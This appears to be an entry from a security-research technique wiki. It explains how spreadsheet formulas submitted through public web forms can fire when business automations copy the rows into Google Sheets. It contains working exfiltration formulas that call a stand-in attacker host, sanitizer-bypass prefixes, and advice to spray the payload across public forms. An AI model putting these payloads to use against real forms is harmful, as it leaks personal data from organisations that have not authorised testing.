---
title: Google Docs `IMPORTHTML` CSV-style blind exfil via downstream Sheets automation
slug: google-docs-importhtml-csv-injection
created_utc: 2026-05-14T00:00:00Z
updated_utc: 2026-05-14T00:00:00Z
tags: [technique/dom-xss, technique/csv-injection, technique/blind-xss, technique/google-sheets]
inbound: []
---

# Google Docs `IMPORTHTML` CSV-style blind exfil via downstream Sheets automation

## Pattern

Classic CSV injection (`=cmd|...`) is well-defended in modern apps;
Google Sheets specifically sanitizes formulas when *imported* through
its native CSV-import flow. But Sheets formulas — particularly
`IMPORTHTML(<url>, "table", n)` — are *not* sanitized when a row is
inserted via the Sheets API (which is what Zapier / Workato / custom
integrations use). Result: blind-spray `=IMPORTHTML(...)` payloads
through every public form you can find (Salesforce-hosted intake,
HubSpot forms, Zendesk widgets); the payload sits dormant in the
upstream CRM; when the downstream automation copies the row into
Sheets, the formula activates the next time an employee opens that
sheet — making a client-side fetch from the employee's browser to an
attacker-controlled URL with the leaked row data interpolated in.

Differs from the markdown-image-XSS class in AI apps (that's an
`<img src>` rendered into chat) — same shape (force the victim
browser to fetch attacker URL with sensitive data interpolated), but
the activator is a Sheets formula in an enterprise workflow.

## Preconditions

- Public form that accepts a text field without formula stripping.
- Downstream automation (Zapier, Workato, custom Sheets API) that
  inserts the row into a Google Sheet *without* sanitizing formulas.
- An employee will eventually open that Sheet.

## Detection

- Live test: submit `=HYPERLINK("https://attacker/test")` through the
  form; wait for callback.
- Better: `=IMPORTHTML("https://attacker/" & A1, "table", 1)` to
  exfil the row's own data when activated.

## Triggering

Spray submission:
```
=IMPORTHTML("https://attacker.com/log?" & TEXTJOIN(",",TRUE,A:A),"table",1)
```
Activates on Sheet open. The exfiltrated row is concatenated into the
URL; attacker sees `email,name,note,...` in their access logs.

## Bypasses

- Some integrations sanitize a leading `=` — try `+`, `-`, `@`
  prefixes (Excel-compatible) or `\t=` whitespace-prefix.

## Seen in the wild

- {date: 2025-circa, source: CT Ep 150} — Ajax01 / HX / Eric / Sajib team
  blog "Who Needs Blind XSS?" — sprayed across many public forms;
  hits trickled in over weeks and months; one hit was a bug-bounty
  live-hacking-event invite form.

## References

- Ajax01 "Who Needs Blind XSS?" writeup
- Critical Thinking Podcast Ep 150
- Related: [[../dom-xss/url-credential-payload-smuggling]] (same shape:
  invisible payload, victim-side fetch)
